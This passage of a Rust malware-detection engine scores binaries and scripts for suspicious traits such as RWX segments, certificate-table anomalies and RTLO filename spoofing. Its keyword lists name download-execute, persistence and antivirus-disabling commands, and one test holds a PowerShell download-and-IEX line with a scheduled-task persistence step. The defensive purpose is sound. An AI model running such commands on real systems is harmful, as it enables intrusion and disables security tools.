                .filter_map(|section| {
                    (section.pointer_to_raw_data as usize)
                        .checked_add(section.size_of_raw_data as usize)
                })
                .max()
                .unwrap_or_default();
            if raw_end < data.len() {
                let overlay = &data[raw_end..];
                if overlay.len() >= 1024 * 1024 && entropy(overlay) >= 7.35 {
                    indicators.push("encrypted_overlay_payload".to_string());
                }
            }

            // entry point anomaly: entry_rva not in exec section
            let entry = pe.entry;
            if entry != 0 {
                let mut in_exec = false;
                for s in &pe.sections {
                    let va = s.virtual_address as u64;
                    let vsz = s.virtual_size as u64;
                    if let Some(end) = va.checked_add(vsz) {
                        if (entry as u64) >= va && (entry as u64) < end {
                            // check executable flag
                            if s.characteristics & goblin::pe::section_table::IMAGE_SCN_MEM_EXECUTE
                                != 0
                            {
                                in_exec = true;
                            }
                        }
                    }
                }
                if !in_exec {
                    indicators.push("entry_point_anomaly".to_string());
                }
            }
        }
        Ok(Object::Elf(elf)) => {
            // segment permissions
            for ph in &elf.program_headers {
                let flags = ph.p_flags;
                // RWX without separation is suspicious
                let is_r = flags & goblin::elf::program_header::PF_R != 0;
                let is_w = flags & goblin::elf::program_header::PF_W != 0;
                let is_x = flags & goblin::elf::program_header::PF_X != 0;
                if is_r && is_w && is_x {
                    indicators.push(format!("unsafe_segment_flags: phdr {:?}", ph.p_type));
                    break;
                }
            }

            // entry point anomaly: entry not in executable segment
            let entry = elf.entry;
            let mut in_exec = false;
            for ph in &elf.program_headers {
                if ph.p_type == goblin::elf::program_header::PT_LOAD {
                    let start = ph.p_vaddr;
                    if let Some(end) = ph.p_vaddr.checked_add(ph.p_memsz) {
                        if (entry >= start)
                            && (entry < end)
                            && ph.p_flags & goblin::elf::program_header::PF_X != 0
                        {
                            in_exec = true;
                        }
                    }
                }
            }
            if !in_exec {
                indicators.push("entry_point_anomaly".to_string());
            }

            // many deps
            let deps = elf.libraries.len();
            if deps > 5 {
                indicators.push(format!("many_deps: {}", deps));
            }
        }
        Ok(Object::Mach(mach)) => {
            // Mach-O: inspect load commands for segment permissions and dylibs
            if let goblin::mach::Mach::Binary(mach) = mach {
                for seg in mach.segments.iter() {
                    if seg.initprot & goblin::mach::constants::VM_PROT_READ != 0
                        && seg.initprot & goblin::mach::constants::VM_PROT_WRITE != 0
                        && seg.initprot & goblin::mach::constants::VM_PROT_EXECUTE != 0
                    {
                        indicators.push("unsafe_segment_flags".to_string());
                        break;
                    }
                }

                // dylib deps
                let deps = mach.libs.len();
                if deps > 5 {
                    indicators.push(format!("many_deps: {}", deps));
                }
            }
        }
        Ok(_) => {
            // unknown / other formats: leave score 0
        }
        Err(e) => {
            // A certificate-table anomaly is real, explainable evidence even
            // when the parser refuses the rest of the image.
            if indicators
                .iter()
                .any(|indicator| indicator.contains("signature:mismatch"))
            {
                let static_score = score_static_signals(&indicators);
                return Ok(HeuristicScore {
                    score: static_score.score,
                    indicators,
                });
            }
            return Err(HeuristicError::Parse(format!("{}", e)));
        }
    }

    let static_score = score_static_signals(&indicators);
    let mut merged = indicators;
    for indicator in static_score.indicators {
        if !merged.iter().any(|existing| existing == &indicator) {
            merged.push(indicator);
        }
    }

    Ok(HeuristicScore {
        score: static_score.score,
        indicators: merged,
    })
}

/// Analyze a file together with its path context. This keeps the raw byte
/// analyzer reusable for cache/model tests while letting the scanner apply a
/// bounded, explainable adjustment for trusted installation roots and common
/// delivery directories.
pub fn analyze_bytes_with_context(
    data: &[u8],
    path: &Path,
) -> Result<HeuristicScore, HeuristicError> {
    let mut result = analyze_bytes(data)?;
    let original = result.score;
    // Right-to-left override/embedding marks in a filename are a classic
    // extension-spoofing trick (e.g. "invoice<RTLO>exe.txt") and are
    // essentially never present in legitimate filenames.
    let file_name = path
        .file_name()
        .map(|name| name.to_string_lossy().to_string())
        .unwrap_or_default();
    if file_name
        .chars()
        .any(|c| matches!(c, '\u{202E}' | '\u{202C}' | '\u{200F}'))
    {
        result.indicators.push("rtlo_filename_spoofing".to_string());
        result.score = calibrated_score(&[original, 0.35]);
    } else {
        result.score = adjust_score_by_path(original, path);
    }
    match classify_path_context(path) {
        PathContext::System32Drivers => result
            .indicators
            .push("path_context:system32_drivers".to_string()),
        PathContext::TempDirectory => result
            .indicators
            .push("path_context:temporary_directory".to_string()),
        PathContext::Downloads => result.indicators.push("path_context:downloads".to_string()),
        PathContext::Desktop => result.indicators.push("path_context:desktop".to_string()),
        _ => {}
    }
    Ok(result)
}

/// Inspect script and command text for a small, conservative set of trojan
/// behaviors. This is intentionally path-gated by the scanner to script-like
/// extensions; ordinary documents and binaries are not classified from loose
/// strings. A single command is not enough for a verdict: the score rises
/// when download/execute, persistence, LOLBin, or security-tampering signals
/// corroborate one another.
pub fn analyze_script_bytes(data: &[u8]) -> HeuristicScore {
    let text = String::from_utf8_lossy(data).to_ascii_lowercase();
    let mut indicators = Vec::new();
    let mut weights = Vec::new();
    let contains_any = |needles: &[&str]| needles.iter().any(|needle| text.contains(needle));

    let encoded_payload = contains_any(&["frombase64string", "-enc ", "-encodedcommand"])
        && contains_any(&["iex", "invoke-expression", "downloadstring", "downloadfile"]);
    if encoded_payload {
        indicators.push("script_encoded_download_execute".to_string());
        weights.push(0.78);
    }

    let download_execute = contains_any(&[
        "downloadstring",
        "downloadfile",
        "invoke-webrequest",
        "bitsadmin",
        "certutil -urlcache",
    ]) && contains_any(&[
        "iex",
        "invoke-expression",
        "start-process",
        "rundll32",
        "mshta",
    ]);
    if download_execute {
        indicators.push("script_download_execute_chain".to_string());
        weights.push(0.68);
    }

    let persistence = (text.contains("reg add")
        && contains_any(&["currentversion\\run", "currentversion/run"]))
        || (text.contains("schtasks") && contains_any(&["/create", "create "]))
        || text.contains("start menu\\programs\\startup")
        || text.contains("\\startup\\");
    if persistence {
        indicators.push("script_persistence".to_string());
        weights.push(0.62);
    }

    let lolbin_chain = contains_any(&["rundll32", "regsvr32", "mshta", "wscript", "cscript"])
        && contains_any(&["http://", "https://", "\\temp\\", "/temp/"]);
    if lolbin_chain {
        indicators.push("script_lolbin_chain".to_string());
        weights.push(0.58);
    }

    let security_tampering = contains_any(&[
        "set-mppreference -disablerealtimemonitoring",
        "set-mppreference -exclusionpath",
        "vssadmin delete shadows",
        "wbadmin delete catalog",
    ]);
    if security_tampering {
        indicators.push("script_security_tampering".to_string());
        weights.push(0.72);
    }

    HeuristicScore {
        score: calibrated_score(&weights),
        indicators,
    }
}

fn contains_ascii_case_insensitive(data: &[u8], needle: &[u8]) -> bool {
    !needle.is_empty()
        && data.windows(needle.len()).any(|window| {
            window
                .iter()
                .zip(needle.iter())
                .all(|(left, right)| left.eq_ignore_ascii_case(right))
        })
}

/// Inspect the raw PE headers for an attribute-certificate table whose
/// contents fall outside the file or violate the 8-byte entry alignment.
/// Returns a rulebook-matching signal string, or `None` when the headers are
/// absent/malformed before the optional header (in which case full parsing
/// reports its own error).
fn preparse_certificate_anomaly(data: &[u8]) -> Option<String> {
    if data.len() < 0x40 + 4 + 20 + 2 {
        return None;
    }
    let e_lfanew =
        u32::from_le_bytes([data[0x3c], data[0x3d], data[0x3e], data[0x3f]]) as usize;
    if e_lfanew == 0 || e_lfanew + 4 + 20 > data.len() {
        return None;
    }
    if &data[e_lfanew..e_lfanew + 4] != b"PE\0\0" {
        return None;
    }
    let opt = e_lfanew + 4 + 20;
    let magic = u16::from_le_bytes([data[opt], data[opt + 1]]);
    // Offset of the data-directory array inside the optional header.
    let directories_offset = match magic {
        0x10b => 96usize,  // PE32: 96 bytes of fixed fields
        0x20b => 112usize, // PE32+: 112 bytes of fixed fields
        _ => return None,
    };
    let count_offset = directories_offset - 4;
    if opt + count_offset + 4 > data.len() {
        return None;
    }
    let directory_count = u32::from_le_bytes([
        data[opt + count_offset],
        data[opt + count_offset + 1],
        data[opt + count_offset + 2],
        data[opt + count_offset + 3],
    ]) as usize;
    if directory_count <= 4 {
        return None;
    }
    // Security directory is entry 4; note its "virtual address" is a raw
    // file offset per the PE specification.
    let cert = opt + directories_offset + 4 * 8;
    if cert + 8 > data.len() {
        return None;
    }
    let size = u32::from_le_bytes([data[cert + 4], data[cert + 5], data[cert + 6], data[cert + 7]]);
    if size == 0 {
        return None;
    }
    let start = u32::from_le_bytes([data[cert], data[cert + 1], data[cert + 2], data[cert + 3]])
        as usize;
    let end = start.checked_add(size as usize).unwrap_or(usize::MAX);
    if end > data.len() {
        return Some("signature:mismatch:certificate_table_truncated".to_string());
    }
    if size % 8 != 0 {
        return Some("signature:mismatch:certificate_table_unaligned".to_string());
    }
    None
}

fn compiler_fingerprint(
    data: &[u8],
    linker_major: u8,
    linker_minor: u8,
    compile_timestamp: u32,
) -> CompilerFingerprint {
    let pdb_path = find_ascii_pdb_path(data).unwrap_or_default();
    CompilerFingerprint {
        linker_version: format!("{linker_major}.{linker_minor}"),
        pdb_path,
        compile_timestamp,
    }
}

fn find_ascii_pdb_path(data: &[u8]) -> Option<String> {
    // Debug directory metadata is normally near the PE headers. Bound this
    // scan so a large sample cannot turn a weak optional signal into a full
    // repeated pass over the 64 MiB static-analysis window.
    let scan_end = data.len().min(4 * 1024 * 1024);
    for end in 4..=scan_end {
        if !data[end - 4..end].eq_ignore_ascii_case(b".pdb") {
            continue;
        }
        let mut start = end.saturating_sub(1);
        while start > 0 {
            let byte = data[start - 1];
            if byte.is_ascii_graphic() || byte == b' ' {
                start -= 1;
            } else {
                break;
            }
        }
        let candidate = &data[start..end];
        if candidate.iter().any(|byte| *byte == b'\\' || *byte == b'/') && candidate.len() <= 512 {
            return Some(String::from_utf8_lossy(candidate).into_owned());
        }
    }
    None
}

/// Detect a nested PE image without treating a normal `MZ` string as a hit.
/// The nested image must have a valid in-buffer PE header and must not be the
/// primary image at offset zero.
fn contains_embedded_pe(data: &[u8]) -> bool {
    if data.len() < 0x40 {
        return false;
    }
    for offset in 1..data.len().saturating_sub(0x40) {
        if data.get(offset..offset + 2) != Some(b"MZ") {
            continue;
        }
        let Some(e_lfanew_bytes) = data.get(offset + 0x3c..offset + 0x40) else {
            continue;
        };
        let e_lfanew = u32::from_le_bytes(e_lfanew_bytes.try_into().unwrap()) as usize;
        let Some(pe_offset) = offset.checked_add(e_lfanew) else {
            continue;
        };
        if data.get(pe_offset..pe_offset + 4) == Some(b"PE\0\0") {
            return true;
        }
    }
    false
}

fn is_timestamp_anomalous(ts: u32) -> bool {
    let now = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or(Duration::from_secs(0))
        .as_secs();
    let ts64 = ts as u64;
    // too far in future (>30 days) or older than 20 years
    let thirty_days = 60 * 60 * 24 * 30;
    let twenty_years = 60 * 60 * 24 * 365 * 20;
    if ts64 > now + thirty_days as u64 {
        return true;
    }
    if ts64 < now.saturating_sub(twenty_years as u64) {
        return true;
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;

    // Minimal valid 64-bit, little-endian ELF header without program/section tables.
    #[test]
    fn test_analyze_elf_magic() {
        let mut elf = vec![0u8; 64];
        elf[0..4].copy_from_slice(b"\x7fELF");
        elf[4] = 2; // ELFCLASS64
        elf[5] = 1; // ELFDATA2LSB
        elf[6] = 1; // EV_CURRENT
        elf[16..18].copy_from_slice(&2u16.to_le_bytes()); // ET_EXEC
        elf[18..20].copy_from_slice(&0x3eu16.to_le_bytes()); // EM_X86_64
        elf[20..24].copy_from_slice(&1u32.to_le_bytes()); // EV_CURRENT
        elf[52..54].copy_from_slice(&64u16.to_le_bytes()); // ELF header size
        elf[54..56].copy_from_slice(&56u16.to_le_bytes()); // program header size
        elf[58..60].copy_from_slice(&64u16.to_le_bytes()); // section header size
        let res = analyze_bytes(&elf).expect("analyze");
        // No strong indicators expected for tiny sample
        assert!(res.score >= 0.0 && res.score <= 1.0);
    }

    #[test]
    fn script_trojan_chain_requires_correlated_signals() {
        let benign = analyze_script_bytes(b"Write-Host 'hello'");
        assert_eq!(benign.score, 0.0);

        let suspicious = analyze_script_bytes(
            br#"$x = (New-Object Net.WebClient).DownloadString('https://example.invalid/a');
               IEX $x; schtasks /create /sc onlogon /tn update /tr powershell.exe"#,
        );
        assert!(suspicious.score >= 0.8);
        assert!(suspicious
            .indicators
            .iter()
            .any(|indicator| indicator == "script_persistence"));
    }

    // Minimal crafted PE-like bytes
    #[test]
    fn test_analyze_pe_magic() {
        let mut pe = vec![0u8; 512];
        pe[0] = b'M';
        pe[1] = b'Z';
        // e_lfanew at offset 0x3c -> point into file
        let e_lfanew = 0x80u32;
        pe[0x3c..0x40].copy_from_slice(&e_lfanew.to_le_bytes());
        // PE signature at e_lfanew
        pe[e_lfanew as usize..e_lfanew as usize + 4].copy_from_slice(&[b'P', b'E', 0, 0]);
        let res = analyze_bytes(&pe).expect("analyze pe");
        assert!(res.score >= 0.0 && res.score <= 1.0);
    }

    #[test]
    fn analyze_bytes_includes_bounded_unpacking_evidence() {
        let mut pe = vec![0u8; 512];
        pe[0] = b'M';
        pe[1] = b'Z';
        pe[0x3c..0x40].copy_from_slice(&0x80u32.to_le_bytes());
        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
        pe[0x180..0x184].copy_from_slice(b"UPX0");
        let result = analyze_bytes(&pe).expect("analyze PE");
        assert!(result
            .indicators
            .iter()
            .any(|indicator| indicator == "packer_detected:upx"));
    }

    #[test]
    fn entropy_profile_handles_empty_and_small_inputs() {
        let empty = analyze_entropy_distribution(&[]);
        assert!(empty.blocks.is_empty());
        let small = analyze_entropy_distribution(b"ordinary data");
        assert!(!small.blocks.is_empty());
        assert!(small.score() <= 0.55);
    }

    #[test]
    fn api_context_score_requires_injection_and_secondary_intent() {
        assert_eq!(score_api_combinations(&["DeleteFileW".to_string()]), 0.0);
        assert!(
            score_api_combinations(&[
                "VirtualAllocEx".to_string(),
                "WriteProcessMemory".to_string(),
                "DeleteFileW".to_string(),
                "RegSetValueExW".to_string(),
            ]) >= 0.5
        );
    }

    #[test]
    fn path_context_is_bounded_and_does_not_erase_strong_evidence() {
        let system32 = Path::new(r"C:\Windows\System32\svchost.exe");
        let drivers = Path::new(r"C:\Windows\System32\drivers\payload.dll");
        assert!(adjust_score_by_path(0.4, system32) < 0.4);
        assert!(adjust_score_by_path(0.9, system32) >= 0.9);
        assert!(adjust_score_by_path(0.4, drivers) > 0.4);
    }

    #[test]
    fn compiler_fingerprint_is_only_a_weak_context_signal() {
        let fingerprint = CompilerFingerprint {
            linker_version: "6.0".to_string(),
            pdb_path: r"C:\Users\hacker\Desktop\sample.pdb".to_string(),
            compile_timestamp: 1_700_000_000,
        };
        assert!(fingerprint.score_anomaly() >= 0.25);
        assert!(
            CompilerFingerprint {
                linker_version: "14.0".to_string(),
                pdb_path: String::new(),
                compile_timestamp: 0,
            }
            .score_anomaly()
                < 0.25
        );
    }

    #[test]
    fn test_dynamic_behavior_sequence_scores_injection_chain() {
        let events = vec![
            "VirtualAlloc".to_string(),
            "WriteProcessMemory".to_string(),
            "CreateRemoteThread".to_string(),
        ];
        let score = score_dynamic_behavior(&events);
        assert!(
            score.score > 0.65,
            "injection chain should score high: {:?}",
            score
        );
    }

    #[test]
    fn static_rulebook_keeps_white_black_chain_explicit() {
        let score = score_static_signals(&["white_black_sideload_injection".to_string()]);
        assert!(score.score >= 0.48);
        assert!(score
            .indicators
            .iter()
            .any(|indicator| indicator.contains("Proxy-DLL side-loading")));
    }

    #[test]
    fn threadpool_obfuscation_requires_correlated_memory_or_resolution_signals() {
        let benign = score_dynamic_behavior(&[
            "CreateThreadpoolWork".to_string(),
            "SubmitThreadpoolWork".to_string(),
        ]);
        assert!(benign.score < 0.34);

        let suspicious = score_dynamic_behavior(&[
            "CreateThreadpoolWork".to_string(),
            "SubmitThreadpoolWork".to_string(),
            "VirtualProtect".to_string(),
            "GetProcAddress".to_string(),
        ]);
        assert!(suspicious
            .indicators
            .iter()
            .any(|indicator| indicator.contains("Thread-pool")));
        assert!(suspicious.score >= 0.34);
    }

    #[test]
    fn silver_fox_driver_termination_chain_scores_high() {
        let score = score_dynamic_behavior(&[
            "amsdk.sys".to_string(),
            "NtTerminateProcess".to_string(),
            "MsMpEng.exe".to_string(),
        ]);
        assert!(score.score >= 0.7);
    }

    /// Build a minimal parseable PE64 with a single section carrying the
    /// given characteristics and optional extra bytes appended after the
    /// section header.
    fn minimal_pe(section_characteristics: u32, extra: &[u8]) -> Vec<u8> {
        let mut pe = vec![0u8; 0x400];
        pe[0] = b'M';
        pe[1] = b'Z';
        let e_lfanew = 0x80u32;
        pe[0x3c..0x40].copy_from_slice(&e_lfanew.to_le_bytes());
        pe[e_lfanew as usize..e_lfanew as usize + 4].copy_from_slice(b"PE\0\0");
        // COFF header: machine AMD64, 1 section, optional header size 240.
        let coff = e_lfanew as usize + 4;
        pe[coff..coff + 2].copy_from_slice(&0x8664u16.to_le_bytes());
        pe[coff + 2..coff + 4].copy_from_slice(&1u16.to_le_bytes());
        pe[coff + 16..coff + 18].copy_from_slice(&240u16.to_le_bytes());
        // Optional header magic PE32+ right after COFF.
        let opt = coff + 20;
        pe[opt..opt + 2].copy_from_slice(&0x20bu16.to_le_bytes());
        // Sixteen data directories so directory-based checks engage.
        pe[opt + 108..opt + 112].copy_from_slice(&16u32.to_le_bytes());
        // Section table after the standard 240-byte PE32+ optional header.
        let section = opt + 240;
        pe[section..section + 8].copy_from_slice(b".text\0\0\0");
        pe[section + 36..section + 40].copy_from_slice(&section_characteristics.to_le_bytes());
        if !extra.is_empty() {
            let end = (section + 40 + extra.len()).min(pe.len());
            pe[section + 40..end].copy_from_slice(&extra[..end - section - 40]);
        }
        pe
    }

    #[test]
    fn writable_executable_sections_raise_wx_indicator() {
        const IMAGE_SCN_MEM_EXECUTE: u32 = 0x2000_0000;
        const IMAGE_SCN_MEM_WRITE: u32 = 0x8000_0000;
        const IMAGE_SCN_MEM_READ: u32 = 0x4000_0000;

        let safe = analyze_bytes(&minimal_pe(IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ, &[]))
            .expect("analyze");
        assert!(!safe.indicators.iter().any(|s| s.contains("wx_section")));

        let wx = analyze_bytes(&minimal_pe(
            IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ,
            &[],
        ))
        .expect("analyze");
        assert!(wx.indicators.iter().any(|s| s.starts_with("wx_section")));
        assert!(wx.score >= 0.30, "wx_section rule must contribute: {:?}", wx);
    }

    #[test]
    fn keyboard_hook_import_combo_raises_hooking_chain() {
        let benign = analyze_bytes(&minimal_pe(
            0x6000_0020,
            b"kernel32.dll\0ExitProcess\0",
        ))
        .expect("analyze");
        assert!(!benign
            .indicators
            .iter()
            .any(|s| s.contains("hooking_chain")));

        let hooked = analyze_bytes(&minimal_pe(
            0x6000_0020,
            b"user32.dll\0SetWindowsHookExW\0GetAsyncKeyState\0",
        ))
        .expect("analyze");
        assert!(hooked
            .indicators
            .iter()
            .any(|s| s.contains("hooking_chain")));
        assert!(hooked.score >= 0.30);
    }

    #[test]
    fn credential_harvest_chain_requires_three_independent_families() {
        // Clipboard access alone is too common to flag.
        let capture_only = analyze_bytes(&minimal_pe(
            0x6000_0020,
            b"user32.dll\0GetClipboardData\0",
        ))
        .expect("analyze");
        assert!(!capture_only
            .indicators
            .iter()
            .any(|s| s.contains("credential_harvest_chain")));

        // Capture plus a credential-store artifact without collection
        // support stays neutral.
        let capture_store = analyze_bytes(&minimal_pe(
            0x6000_0020,
            b"GetClipboardData\0Wallet.dat\0",
        ))
        .expect("analyze");
        assert!(!capture_store
            .indicators
            .iter()
            .any(|s| s.contains("credential_harvest_chain")));

        // All three independent families together raise the chain.
        let chain = analyze_bytes(&minimal_pe(
            0x6000_0020,
            b"GetClipboardData\0Wallet.dat\0FtpWebRequest\0",
        ))
        .expect("analyze");
        assert!(chain
            .indicators
            .iter()
            .any(|s| s.contains("credential_harvest_chain")));
        assert!(chain.score >= 0.42, "chain weight must apply: {:?}", chain);
    }

    #[test]
    fn truncated_certificate_table_is_a_signature_anomaly() {
        // Certificate directory (data directory index 4, at optional-header
        // offset 112 + 32 for PE32+) pointing past the end of the tiny file
        // must surface a signature mismatch.
        let mut pe = minimal_pe(0x6000_0020, &[]);
        let cert_dir = 0x80usize + 4 + 20 + 112 + 32;
        pe[cert_dir..cert_dir + 4].copy_from_slice(&0x1_0000u32.to_le_bytes());
        pe[cert_dir + 4..cert_dir + 8].copy_from_slice(&0x200u32.to_le_bytes());
        let result = analyze_bytes(&pe).expect("analyze");
        assert!(result
            .indicators
            .iter()
            .any(|s| s.contains("signature:mismatch")));
        assert!(result.score >= 0.25);
    }

    #[test]
    fn rtlo_filename_spoofing_adds_rule_weight() {
        let pe = minimal_pe(0x6000_0020, &[]);
        let plain = analyze_bytes_with_context(&pe, Path::new(r"C:\Downloads\invoice.pdf"))
            .expect("analyze");
        let spoofed = analyze_bytes_with_context(
            &pe,
            Path::new("C:\\Downloads\\invoice\u{202E}fdp.exe"),
        )
        .expect("analyze");

        assert!(!plain
            .indicators
            .iter()
            .any(|s| s.contains("rtlo_filename_spoofing")));
        assert!(spoofed
            .indicators
            .iter()
            .any(|s| s.contains("rtlo_filename_spoofing")));
        assert!(spoofed.score > plain.score);
        assert!(spoofed.score >= 0.35);
    }
}
